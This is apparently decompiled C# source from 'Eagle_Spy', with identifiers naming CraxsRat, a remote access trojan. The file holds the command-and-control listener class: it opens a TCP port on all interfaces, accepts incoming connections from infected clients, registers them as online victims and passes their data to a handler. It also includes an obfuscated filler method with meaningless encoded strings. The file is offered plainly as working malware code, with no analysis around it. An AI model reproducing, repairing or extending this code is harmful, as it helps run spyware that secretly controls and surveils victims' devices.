using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Eagle_Spy.My.Resources;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy.sockets
{
	// Token: 0x020000B4 RID: 180
	public class Accept
	{
		// Token: 0x06000969 RID: 2409 RVA: 0x000E7CF4 File Offset: 0x000E5EF4
		public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsokygbhs(string PORTt)
		{
			try
			{
				this.randomnumber = new Random();
				this.SyncObj = this.RequestsReceiver;
				this.Syncrecive = RuntimeHelpers.GetObjectValue(new object());
				this.RequestsReceiver = new List<ListData>();
				int num = Conversions.ToInteger(PORTt);
				if (this.CheckPort(num))
				{
					this.Myport = Conversions.ToString(num);
					this.MainListner = new TcpListener(IPAddress.Any, num);
					this.MainListner.Server.SendTimeout = -1;
					this.MainListner.Server.ReceiveTimeout = -1;
					this.MainListner.Server.SendBufferSize = 16384;
					this.MainListner.Server.ReceiveBufferSize = 16384;
					this.MainListner.Start();
					new Thread(new ThreadStart(this.ScanerAsync))
					{
						IsBackground = true
					}.Start();
					new Thread(new ThreadStart(this.DataHandlerAsync))
					{
						IsBackground = true,
						Name = "DataHandel"
					}.Start();
					this.closing = false;
				}
				else
				{
					Codes.MyMsgBox("Port in use", "The specified port (" + PORTt + ") is already in use", false, Resources.information48px);
					Environment.Exit(0);
				}
				infoServer.PORTS = infoServer.PORTS + PORTt + " ";
			}
			catch (Exception ex)
			{
				Codes.MyMsgBox(PORTt + "- ERROR", "Exception while opening Port: " + PORTt, false, Resources.error48px);
			}
		}

		// Token: 0x0600096A RID: 2410 RVA: 0x000E7E98 File Offset: 0x000E6098
		public Accept(string Paramaterp)
		{
			this.closing = true;
			this.Blocklist = new List<string>();
			this.RequestsReceiver = new List<ListData>();
			this.SocketHandler = new ManualResetEvent(false);
			this.iamout = false;
			this.Myport = "";
			this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsokygbhs(Paramaterp);
		}

		// Token: 0x0600096B RID: 2411 RVA: 0x000E7EF0 File Offset: 0x000E60F0
		public void ScanerAsync()
		{
			while (Data.MainForm.Alive)
			{
				try
				{
					Thread.Sleep(1);
					this.SocketHandler.Reset();
					this.MainListner.BeginAcceptTcpClient(new AsyncCallback(this.AcceptClient), this.MainListner);
					this.SocketHandler.WaitOne();
				}
				catch (SocketException ex)
				{
					this.iamout = true;
					break;
				}
				catch (Exception ex2)
				{
					this.iamout = true;
					break;
				}
			}
		}

		// Token: 0x0600096C RID: 2412 RVA: 0x000E7F90 File Offset: 0x000E6190
		private void AcceptClient(IAsyncResult ar)
		{
			try
			{
				Client client = new Client(this.MainListner.EndAcceptTcpClient(ar), ((IPEndPoint)this.MainListner.LocalEndpoint).Port, this);
				if (!Data.ClientsOnline.Contains(client.ClientRemoteAddress))
				{
					Data.LOGIT(client, "New Connection", client.Flag);
					Data.ClientsOnline.Add(new object[] { client, client.myClient }, client.ClientRemoteAddress, null, null);
				}
			}
			catch (ObjectDisposedException ex)
			{
			}
			catch (SocketException ex2)
			{
			}
			catch (Exception ex3)
			{
			}
			try
			{
				Thread.Sleep(1);
				this.SocketHandler.Set();
			}
			catch (Exception ex4)
			{
			}
		}

		// Token: 0x0600096D RID: 2413 RVA: 0x000E8094 File Offset: 0x000E6294
		private void DataHandlerAsync()
		{
			while (!this.iamout)
			{
				Thread.Sleep(1);
				ListData listData = null;
				object objectValue = RuntimeHelpers.GetObjectValue(this.SyncObj);
				try
				{
					object obj = objectValue;
					ObjectFlowControl.CheckForSyncLockOnValueType(obj);
					lock (obj)
					{
						if (this.RequestsReceiver.Count > 0)
						{
							listData = this.RequestsReceiver[0];
							this.RequestsReceiver.RemoveAt(0);
						}
					}
					if (listData != null)
					{
						Data.HandelData(new object[] { listData.ClassClient, listData.bByte, listData.SizeData, listData.TcpClient });
						listData.wait = true;
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x0600096E RID: 2414 RVA: 0x000E8174 File Offset: 0x000E6374
		private bool CheckPort(int Port)
		{
			IPGlobalProperties ipglobalProperties = IPGlobalProperties.GetIPGlobalProperties();
			IPEndPoint[] activeTcpListeners = ipglobalProperties.GetActiveTcpListeners();
			IPEndPoint[] array = activeTcpListeners;
			foreach (IPEndPoint ipendPoint in array)
			{
				if (ipendPoint.Port == Port)
				{
					return false;
				}
			}
			return true;
		}

		// Token: 0x0600096F RID: 2415 RVA: 0x000E81B8 File Offset: 0x000E63B8
		internal static string CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdfc(string v, string v2, int v1)
		{
			string text = null;
			try
			{
				string text2;
				do
				{
					text2 = "+w3YoxSWNZ0Rao4T6OreWKbHMmAdzVJVQ==";
				}
				while (text2.Length <= 0);
				string text3;
				do
				{
					text3 = "+RrXZvX6AX1gSq5+FNT8TKi65VQFdV/leEI0IssR8Z8cDwoRQBykIEzLM2JRqxqI4dOOw";
				}
				while (text3.Length <= 0);
				string text4;
				do
				{
					text4 = "tpVQSHwKWyrRRP8y/MjT40wyvBon5BUJlFmXnmfxxXI7JSNtXrg402Do3TZ5dQy6+27jBpFFKYsa";
				}
				while (text4.Length <= 0);
				string text5;
				do
				{
					text5 = "powIOhya6FOraSJcI0RX9yEoa2JizSwp456QM2Rwp2npbto2mhmdioUbcCloGApotMu0DY37Hrn5";
				}
				while (text5.Length <= 0);
				string text6;
				do
				{
					text6 = "+v3NbvUF6nN0U6oG4LjAyY4pIWnBT69ZqWhIdafGdNV7O1BSPdbeymud4SP/MpmeUgXOreD";
				}
				while (text6.Length <= 0);
				while (v2.Length <= 0)
				{
				}
				text = v2;
				return text;
			}
			catch (Exception ex)
			{
			}
			return text;
		}

		// Token: 0x04000B71 RID: 2929
		public bool closing;

		// Token: 0x04000B72 RID: 2930
		public TcpListener MainListner;

		// Token: 0x04000B73 RID: 2931
		public List<string> Blocklist;

		// Token: 0x04000B74 RID: 2932
		public List<ListData> RequestsReceiver;

		// Token: 0x04000B75 RID: 2933
		public long BytesSent;

		// Token: 0x04000B76 RID: 2934
		public long BytesReceived;

		// Token: 0x04000B77 RID: 2935
		public ManualResetEvent SocketHandler;

		// Token: 0x04000B78 RID: 2936
		public Random randomnumber;

		// Token: 0x04000B79 RID: 2937
		public bool iamout;

		// Token: 0x04000B7A RID: 2938
		public string Myport;

		// Token: 0x04000B7B RID: 2939
		public object SyncObj;

		// Token: 0x04000B7C RID: 2940
		public object Syncrecive;
	}
}
